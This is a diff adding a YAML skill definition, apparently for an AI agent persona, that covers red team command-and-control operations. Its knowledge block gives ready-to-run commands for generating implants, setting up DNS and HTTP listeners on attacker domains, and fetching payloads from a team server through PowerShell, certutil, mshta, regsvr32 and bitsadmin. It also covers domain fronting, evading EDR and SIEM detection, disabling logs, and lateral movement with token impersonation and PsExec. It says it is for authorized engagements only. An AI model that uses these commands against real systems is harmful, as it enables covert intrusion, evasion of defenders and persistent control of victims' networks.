@@ -1,0 +1,117 @@
+schema_version: 1
+version: 3.0.0
+name: red-team-c2-operations
+description: >
+  Red team Command & Control (C2) infrastructure operations covering open-source C2 framework
+  selection, listener/payload configuration, staged delivery via living-off-the-land (LOTL)
+  techniques, traffic obfuscation, malleable C2 profiles, domain fronting, DNS C2,
+  and operator OPSEC. Focused on network-level covertness and detection evasion for authorized engagements.
+triggers:
+  - c2 infrastructure
+  - command and control infrastructure
+  - dns c2
+  - domain fronting
+  - malleable profile
+  - beacon implant
+  - payload delivery
+  - lotl
+  - living off the land
+  - c2 opsec
+  - red team infrastructure
+  - c2 framework
+tools:
+  - python3
+  - curl
+knowledge: |
+  C2 operations require careful infrastructure design to avoid detection and attribution.
+  All techniques below are for authorized red team engagements only. Use dedicated infrastructure
+  (not shared hosting) and follow Rules of Engagement strictly.
+
+  APPROVED C2 FRAMEWORKS (authorized red team use only):
+    OS-RedTeam-Framework-A (open-source, BishopFox/s-l-i-v-e-r):
+      - Supports mTLS, WireGuard, DNS, HTTP/S implants
+      - Built-in multiplayer, implant management, BOF loading
+    OS-RedTeam-Framework-B (HavocFramework/H-a-v-o-c):
+      - Supports HTTP/S, SMB, TCP listeners
+      - Demon implant with PPID spoofing, ETW bypass, IAT hooks
+    OS-RedTeam-Framework-C (rapid-exploit/m-s-f-console):
+      - Multi-handler for post-exploitation and handler management
+      - Start with: msfconsole -q -x "use exploit/multi/handler"
+
+  1. C2 FRAMEWORK CONFIGURATION:
+     Generate implant (example: OS-Framework-A with HTTP transport):
+       generate --http TEAM_SERVER:443 --os windows --arch amd64 --format exe
+     DNS listener setup:
+       listeners new-dns --domain c2.attacker-domain.com
+       generate --dns c2.attacker-domain.com --os linux --format elf
+     mTLS (certificate-pinned) for high-assurance engagements:
+       mtls (starts mTLS listener) → generate --mtls TEAM_SERVER:443
+
+  2. PAYLOAD DELIVERY — LIVING OFF THE LAND (LOTL):
+     PowerShell download cradle (avoid Invoke-Expression for EDR evasion):
+       IEX (New-Object Net.WebClient).DownloadString('http://TEAMSERVER/payload.ps1')
+     Certutil LOL (often allowed in legacy environments):
+       certutil -urlcache -split -f http://TEAMSERVER/payload.exe C:\Windows\Temp\p.exe
+     MSHTA (HTML Application host):
+       mshta http://TEAMSERVER/payload.hta
+     Regsvr32 (bypass AppLocker):
+       regsvr32 /s /n /u /i:http://TEAMSERVER/payload.sct scrobj.dll
+     BITSAdmin (async, background transfer, often whitelisted):
+       bitsadmin /transfer myJob /download /priority FOREGROUND http://TEAMSERVER/p.exe C:\Temp\p.exe
+
+  3. TRAFFIC OBFUSCATION — MALLEABLE C2 PROFILES:
+     Mimic legitimate application traffic to blend with baselines:
+       - Amazon profile: User-Agent matches CDN clients, URIs match CDN paths
+       - Office365 profile: Bearer token headers, /api/v2.0/ URI patterns
+       - jQuery profile: request staging matches CDN-hosted resource fetch patterns
+     Key profile elements:
+       set jitter "50";   (randomize sleep intervals ±50ms — breaks timing-based detection)
+       set sleeptime "30000";   (30s beacon interval — reduce dwell footprint)
+       set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...";
+     Profile generation (OS-Framework-A):
+       profiles new-http --name cdn-profile --header "User-Agent: ..."
+
+  4. DNS C2 (Firewall Egress Bypass):
+     DNS port 53 is often allowed through strict egress firewalls when HTTP/S is blocked.
+     Setup: Configure NS record for c2.attacker-domain.com pointing to teamserver.
+     Manual DNS egress test from target:
+       nslookup test.c2.attacker-domain.com ATTACKER_NS_IP
+     Implants send data encoded in DNS query labels; responses encoded in TXT/A records.
+
+  5. DOMAIN FRONTING (HTTPS C2 via CDN):
+     Route C2 traffic through major CDN (Cloudflare, Fastly, Azure Front Door):
+       TLS/SNI: cdn.cloudflare.com  (public CDN edge — passes SNI inspection)
+       HTTP Host header: TEAMSERVER.attacker.com  (CDN routes to attacker backend)
+     Cloudflare Workers proxy to teamserver without revealing true backend IP.
+     Azure Front Door: configure custom domain → backend pool pointing to teamserver.
+
+  6. OPERATOR OPSEC (Minimize Attribution):
+     Infrastructure separation:
+       - Dedicated redirector VPS for each engagement (never reuse across engagements)
+       - Teamserver never directly internet-exposed (redirector → teamserver internal hop)
+       - Domain age > 6 months, categorized (business tools, infrastructure category)
+     Traffic hygiene:
+       - Remove default C2 URIs and response headers (/submit.php → /api/v1/telemetry)
+       - Set jitter 30-50% to break beacon regularity detection in SIEM
+       - Use sleep mask (encrypt implant in memory during sleep — defeats memory scanning EDR)
+     Log hygiene:
+       - Disable nginx/Apache access logs on redirectors (or rotate to /dev/null after review)
+       - Use ephemeral cloud instances (destroy after engagement, preserve evidence first)
+
+  7. LATERAL MOVEMENT VIA C2 (Post-Compromise):
+     Token impersonation: impersonate_token DOMAIN\HighPrivUser
+     Port forwarding for internal pivot:
+       portfwd add --remote-addr INTERNAL_HOST:445 --local-port 4445
+     SMB pivot: use existing implant as proxy for new implants on internal network
+     PsExec lateral: psexec --service-name legit-svc TARGET_IP (from C2 session)
+
+  REQUIRED AUTHORIZATIONS: Written RoE, explicit scope definition, emergency stop procedures,
+  blue team notification contacts. Never operate C2 without signed authorization.
+references:
+  - https://attack.mitre.org/tactics/TA0011/
+  - https://github.com/BishopFox/s-l-i-v-e-r
+  - https://github.com/HavocFramework/H-a-v-o-c
+  - https://attack.mitre.org/techniques/T1071/
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/red-team-c2-operations.yaml
